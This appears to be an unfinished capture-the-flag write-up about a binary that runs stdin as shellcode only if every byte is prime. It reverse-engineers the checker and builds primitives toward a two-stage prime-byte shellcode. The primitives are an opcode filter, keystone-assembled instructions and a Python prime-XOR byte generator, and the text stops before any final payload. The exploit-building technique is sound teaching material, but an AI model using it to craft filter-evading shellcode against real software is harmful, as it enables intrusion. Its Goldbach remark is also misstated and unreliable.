# Reverse engineering

- Function ```main``` is rather simple
- Function ```test_prime``` has a more challenging logic
```C
__int64 test_prime()
{
  unsigned int i; // [rsp+Ch] [rbp-14h]
  size_t v2; // [rsp+18h] [rbp-8h]

  if ( mmap((void *)0x1337000, 0x1000uLL, 7, 50, -1, 0LL) != (void *)0x1337000 )
  {
    perror("error on mmap");
    exit(1);
  }
  v2 = fread((void *)0x1337000, 1uLL, 4096uLL, _bss_start);
  for ( i = 0; (signed int)i < v2; ++i )
  {
    if ( !(unsigned __int8)is_prime(*(_BYTE *)((signed int)i + 0x1337000LL)) )
    {
      printf("Byte %d (value: %u) is not prime.\n", i, *(unsigned __int8 *)((signed int)i + 0x1337000LL));
      exit(0);
    }
  }
  puts("All bytes are prime!");
  return jump_to((__int64 (*)(void))0x1337000);
}
```

Basically, it allocates ```0x1000 RWX``` bytes at address ```0x1337000```, reads ```0x1000``` bytes from stdin to that buffer, checks something and jumps directly to the buffer's beginning.

From the line ```puts("All bytes are prime!");``` we can assume that it checks that all bytes are prime. Let's take a look at the function ```is_prime```:

```C
signed __int64 __fastcall is_prime(unsigned __int8 a1)
{
  signed int i; // [rsp+10h] [rbp-4h]

  if ( a1 <= 1u )
    return 0LL;
  for ( i = 2; i <= 255 && a1 > i; ++i )
  {
    if ( !(a1 % i) )
      return 0LL;
  }
  return 1LL;
}
```

It does indeed check that the passed argument ```(uint8_t)``` is prime.

In conclusion, the binary is pretty simple: it executes the passed shellcode at the known address but all bytes should be prime numbers.

# Creating shellcode

Prime bytes definitely add a challenging part to the task. Since we have RWX memory at known address, the good approach will be to try to make two-stage shellcode: the first stage will be "prime" and will write a normal shellcode (second stage) to known address and then run it. That way we only need to make a write-what-where primitive in prime bytes.

Let's take a look at the x86_64 opcode table to see what instructions we can use. I used table hosted at http://ref.x86asm.net/coder64.html and wrote simple jQuery snippet to extract the opcodes being prime:

```javascript
function convert(elem) {
    return parseInt(elem);
}

function isPrime(value) {
    for(var i = 2; i < value; i++) {
        if(value % i === 0) {
            return false;
        }
    }
    return value > 1;
}


$('tbody').each(function(){
    var elem=$(this).attr("id")
    if (typeof elem === "string") {
        elem="0"+elem;
        var conv=convert(elem);
        //console.log("0"+elem)
        if(isPrime(conv)) {
            console.log(conv)
        }
    }
})
```

Useful instructions:
add eax, imm32
and eax, imm32
xor eax, imm32

```python
from keystone import *

k=Ks(KS_ARCH_X86, KS_MODE_64)

result=[]
hex_result=()

code=("and eax, 0x05050505","add eax, 0x05050505", "xor eax, 0x05050505")

for snippet in code:
    result.append(k.asm(snippet))

for elem in result:
    hex_result+=("0x"+''.join(["%02x" % i for i in elem[0]]),)
```

- Using ```and``` zeroing out ```EAX``` caan be achieved by two ops:

```
 $ gdb --batch -ex "p/t 0xffffffff & 0x05050505 & 0x02020202"
 $1 = 0
```

There's a nice mathematical conjecture named after Goldbach, that states, that every even integer greater than two can be expressed by a sum of three primes. There's also a weak version of this conjuncture, that states the same being true for odd integers greater than 5.

Since XOR'ing is just addition modulo 2 (More exactly in finite abelian group F2)

```python
PRIMES = (2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251)

def gen_byte_generators():
    res = {}
    for i in range(256):
        for a in range(len(PRIMES)):
            for b in range(a, len(PRIMES)):
                for c in range(b, len(PRIMES)):
                    if PRIMES[a] ^ PRIMES[b] ^ PRIMES[c] == i:
                        res[i] = (PRIMES[a], PRIMES[b], PRIMES[c])
                        break
                else:
                    continue
                break
            else:
                continue
            break
        else:
            print('[!] No result found for', i)
    return res
```

Okay, we can get any number in EAX, but what registers can we move that number to? We have no mov r, r opcode but we have xchg eax, ebp and xchg eax, edi.

